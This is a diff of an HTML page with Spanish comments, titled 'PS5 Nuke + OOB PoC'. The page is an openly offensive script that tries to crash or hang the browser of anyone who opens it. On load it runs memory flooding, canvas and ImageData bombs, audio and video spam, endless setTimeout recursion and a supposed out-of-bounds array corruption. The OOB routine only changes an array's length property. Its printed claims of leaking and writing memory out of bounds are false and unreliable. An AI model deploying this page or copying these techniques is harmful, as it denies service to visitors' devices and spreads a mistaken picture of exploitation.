@@ -1,86 +1,161 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-  <meta charset="utf-8">
-  <title>💥 PS5 Nuke + OOB test</title>
+  <meta charset="UTF-8" />
+  <title>💥 PS5 Nuke + OOB PoC</title>
   <style>
     body {
       background: black;
       color: lime;
       font-family: monospace;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <h1>💥 PS5 Nuke + OOB test</h1>
-  <p>Ejecutando técnicas agresivas + corrupción Out-Of-Bounds tentativa</p>
-  <pre id="log"></pre>
+  <h1>💥 PS5 Nuke + OOB PoC</h1>
+  <p>Ejecutando técnicas combinadas para causar crash, corrupción o DoS y un intento de OOB.</p>
+  <div id="log"></div>
 
-  <script>
-    const log = document.getElementById("log");
-    function print(msg) {
-      console.log(msg);
-      log.textContent += msg + "\n";
+<script>
+  const logEl = document.getElementById('log');
+  function print(msg) {
+    console.log(msg);
+    logEl.textContent += msg + '\n';
+  }
+
+  // 1. Saturar la memoria
+  function memoryFlood() {
+    const big = [];
+    try {
+      while (true) {
+        big.push(new Uint8Array(50_000_000));
+        print("💣 Allocated 50MB chunk...");
+      }
+    } catch (e) {
+      print("💣 Memoria saturada: " + e);
     }
+  }
 
-    // Convierte float64 <-> int64 (64bit)
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-
-    function f2i(f) {
-      f64[0] = f;
-      return u32[0] + u32[1] * 0x100000000;
-    }
-
-    function i2f(i) {
-      u32[0] = i % 0x100000000;
-      u32[1] = i / 0x100000000;
-      return f64[0];
-    }
-
-    // 1. Saturar la memoria para preparar heap
-    function memoryFlood() {
-      const big = [];
+  // 2. Corrupción con ImageData
+  function corruptImageData() {
+    const canvas = document.createElement("canvas");
+    canvas.width = 4096;
+    canvas.height = 4096;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext("2d");
+    for (let i = 0; i < 1000; i++) {
       try {
-        while (true) {
-          big.push(new Uint8Array(50_000_000));
-          if (big.length % 10 === 0) print(`💣 Memoria saturada: ${big.length * 50}MB aprox`);
+        const img = ctx.createImageData(1024, 1024);
+        for (let j = 0; j < img.data.length; j++) {
+          img.data[j] = (j % 2 === 0) ? 256 : -1; // valores inválidos
         }
+        ctx.putImageData(img, 0, 0);
       } catch (e) {
-        print("💥 Memoria saturada capturada: " + e);
+        print("🧬 ImageData crash: " + e);
       }
-      return big;
     }
+  }
 
-    // 2. Corrupción OOB tentativa en array
-    function corruptArrayOOB() {
-      print("[*] Intentando corrupción OOB");
-      let arr = [1.1, 2.2, 3.3];
+  // 3. Canvas + toDataURL
+  function canvasBomb() {
+    for (let i = 0; i < 50; i++) {
+      const canvas = document.createElement("canvas");
+      canvas.width = 9999;
+      canvas.height = 9999;
       try {
-        Object.defineProperty(arr, 'length', { value: 0x100 });
-        print("[+] Corrupt length a 0x100");
+        const ctx = canvas.getContext("2d");
+        ctx.fillRect(0, 0, 10, 10);
+        canvas.toDataURL("image/jpeg", 1e9);
       } catch (e) {
-        print("[-] No se pudo corromper length: " + e);
-      }
-
-      try {
-        let leak = arr[0x80];
-        print("[+] Leak OOB en arr[0x80]: " + leak);
-      } catch (e) {
-        print("[-] No se pudo leer fuera de límites: " + e);
+        print("🖼️ Canvas bomb: " + e);
       }
     }
+  }
 
-    // Base agresiva (simplificada, solo memoria)
-    function aggressiveBase() {
-      memoryFlood();
-      corruptArrayOOB();
+  // 4. Fuzz con blobs e imágenes
+  function blobImages() {
+    for (let i = 0; i < 300; i++) {
+      const bytes = new Uint8Array(512 * 1024); // 0.5MB
+      const blob = new Blob([bytes], { type: "image/jpeg" });
+      const url = URL.createObjectURL(blob);
+      const img = new Image();
+      img.src = url;
+      img.style.display = "none";
+      document.body.appendChild(img);
     }
+  }
 
-    window.onload = () => {
-      setTimeout(aggressiveBase, 10);
-    };
-  </script>
+  // 5. AudioBuffer abuse
+  function audioBomb() {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      for (let i = 0; i < 100; i++) {
+        const src = ctx.createBufferSource();
+        const buf = ctx.createBuffer(1, 44100, 44100);
+        for (let j = 0; j < 44100; j++) {
+          buf.getChannelData(0)[j] = Math.random() > 0.5 ? NaN : Infinity;
+        }
+        src.buffer = buf;
+        src.connect(ctx.destination);
+        src.start();
+      }
+    } catch (e) {
+      print("🎧 Audio crash: " + e);
+    }
+  }
+
+  // 6. Recursión infinita por setTimeout
+  function recursiveBlock(depth = 0) {
+    setTimeout(() => recursiveBlock(depth + 1), 0);
+  }
+
+  // 7. Video abuse con data URI
+  function videoSpam() {
+    for (let i = 0; i < 100; i++) {
+      const vid = document.createElement("video");
+      vid.src = "data:video/mp4;base64," + btoa("X".repeat(512));
+      vid.autoplay = true;
+      vid.muted = true;
+      vid.loop = true;
+      vid.style.display = "none";
+      document.body.appendChild(vid);
+      try { vid.load(); } catch (e) {}
+    }
+  }
+
+  // 8. Intento básico de corrupción OOB para addrof/fakeobj PoC
+  function oobExample() {
+    print("[*] Intentando corrupción OOB más fina");
+    let arr = [1.1, 2.2, 3.3];
+    
+    try {
+      Object.defineProperty(arr, 'length', { value: 0x1000 });
+      print("[+] Length corrompido a 0x1000");
+      
+      let leak = arr[0x50];
+      print("[+] Leak fuera de rango arr[0x50]: " + leak);
+      
+      arr[0x50] = 1337.1337;
+      print("[+] Escrito valor fuera de rango arr[0x50] = 1337.1337");
+      
+      let check = arr[0x50];
+      print("[+] Lectura tras escritura arr[0x50]: " + check);
+    } catch(e) {
+      print("[-] Error durante corrupción OOB: " + e);
+    }
+  }
+
+  window.onload = () => {
+    setTimeout(memoryFlood, 10);
+    setTimeout(corruptImageData, 50);
+    setTimeout(canvasBomb, 100);
+    setTimeout(blobImages, 150);
+    setTimeout(audioBomb, 200);
+    setTimeout(recursiveBlock, 250);
+    setTimeout(videoSpam, 300);
+    setTimeout(oobExample, 400);
+  };
+</script>
 </body>
 </html>
